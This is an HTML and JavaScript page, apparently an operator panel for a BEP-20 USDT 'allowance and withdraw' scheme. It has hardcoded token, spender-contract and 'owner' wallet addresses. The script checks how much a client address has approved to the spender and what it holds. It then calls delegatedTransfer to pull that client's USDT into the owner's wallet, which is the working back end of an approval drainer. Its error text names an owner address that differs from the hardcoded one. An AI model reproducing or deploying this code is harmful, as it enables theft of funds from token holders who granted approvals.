<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>BEP-20 Allowance & Withdraw</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
      body {
        font-family: sans-serif;
        padding: 1.5rem;
        margin: 0;
        background: #f5f5f5;
      }
      .container {
        max-width: 500px;
        margin: auto;
        background: white;
        border-radius: 10px;
        padding: 2rem;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
      }
      h2 {
        text-align: center;
        margin-bottom: 1.5rem;
      }
      label {
        display: block;
        margin-bottom: 5px;
        font-weight: bold;
      }
      input {
        width: 100%;
        padding: 0.7rem;
        margin-bottom: 1rem;
        border: 1px solid #ccc;
        border-radius: 6px;
        box-sizing: border-box;
      }
      button {
        padding: 0.7rem 1.2rem;
        margin-top: 0.5rem;
        font-size: 1rem;
        border: none;
        border-radius: 6px;
        cursor: pointer;
      }
      .btn-row {
        display: flex;
        gap: 10px;
        flex-wrap: wrap;
      }
      .btn-row button {
        flex: 1;
      }
      #output {
        margin-top: 1.5rem;
        font-weight: bold;
        text-align: center;
        white-space: pre-line;
      }
      @media (max-width: 600px) {
        .container {
          padding: 1rem;
        }
        button {
          font-size: 1rem;
          width: 100%;
        }
        .btn-row {
          flex-direction: column;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>Token Allowance & Withdraw</h2>

      <label>USDT Contract Address:</label>
      <input
        type="text"
        id="tokenAddress"
        value="0x55d398326f99059ff775485246999027b3197955"
        readonly
      />

      <label>Client/User Address:</label>
      <input id="fromAddress" placeholder="0x..." />

      <label>Recipient Wallet (Owner):</label>
      <input
        type="text"
        id="toAddress"
        value="0xb2592FAA8559aeEB48fE898979f84555268b60aB"
        readonly
      />

      <label>Amount (USDT):</label>
      <input id="amount" type="number" placeholder="e.g. 10" />

      <label>Spender Contract Address:</label>
      <input
        type="text"
        id="contractAddress"
        value="0xeE5044B0f42fe85C0aBf9f3a3F220E466dB8bA52"
        readonly
      />

      <div class="btn-row">
        <button onclick="checkAllowance()">🔍 Check Allowance</button>
        <button onclick="withdraw()">💸 Withdraw</button>
      </div>

      <p id="output"></p>
    </div>

    <script>
      // ✅ Sahi ABI - delegatedTransfer function
      const contractABI = [
        "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
      ];

      async function checkAllowance() {
        const tokenAddress = document.getElementById("tokenAddress").value;
        const from = document.getElementById("fromAddress").value;
        const spender = document.getElementById("contractAddress").value;

        if (!from) {
          document.getElementById("output").innerText =
            "❌ Please enter client address!";
          return;
        }

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);

        const token = new ethers.Contract(
          tokenAddress,
          [
            "function allowance(address owner, address spender) external view returns (uint256)",
            "function balanceOf(address account) external view returns (uint256)",
          ],
          provider,
        );

        try {
          const allowance = await token.allowance(from, spender);
          const balance = await token.balanceOf(from);

          const allowanceFormatted = ethers.utils.formatUnits(allowance, 18);
          const balanceFormatted = ethers.utils.formatUnits(balance, 18);

          document.getElementById("output").innerText =
            `✅ Allowance: ${allowanceFormatted} USDT\n💰 Balance: ${balanceFormatted} USDT`;
        } catch (err) {
          document.getElementById("output").innerText =
            "❌ Error checking allowance.";
          console.error(err);
        }
      }

      async function withdraw() {
        const tokenAddress = document.getElementById("tokenAddress").value;
        const from = document.getElementById("fromAddress").value;
        const to = document.getElementById("toAddress").value;
        const amount = document.getElementById("amount").value;
        const contractAddress =
          document.getElementById("contractAddress").value;

        // Validation
        if (!from) {
          document.getElementById("output").innerText =
            "❌ Please enter client address!";
          return;
        }
        if (!amount || amount <= 0) {
          document.getElementById("output").innerText =
            "❌ Please enter valid amount!";
          return;
        }

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();

        // Check connected wallet is owner
        const signerAddress = await signer.getAddress();
        if (signerAddress.toLowerCase() !== to.toLowerCase()) {
          document.getElementById("output").innerText =
            "❌ Wrong wallet! Connect owner wallet: 0x602085dc...";
          return;
        }

        const contract = new ethers.Contract(
          contractAddress,
          contractABI,
          signer,
        );

        try {
          document.getElementById("output").innerText = "⏳ Processing...";
          const tx = await contract.delegatedTransfer(
            tokenAddress,
            from,
            to,
            ethers.utils.parseUnits(amount, 18),
          );
          document.getElementById("output").innerText =
            "⏳ Waiting for confirmation...";
          await tx.wait();
          document.getElementById("output").innerText =
            "✅ Withdraw successful!";
        } catch (err) {
          document.getElementById("output").innerText =
            "❌ Withdraw failed: " + err.message;
          console.error(err);
        }
      }
    </script>
  </body>
</html>
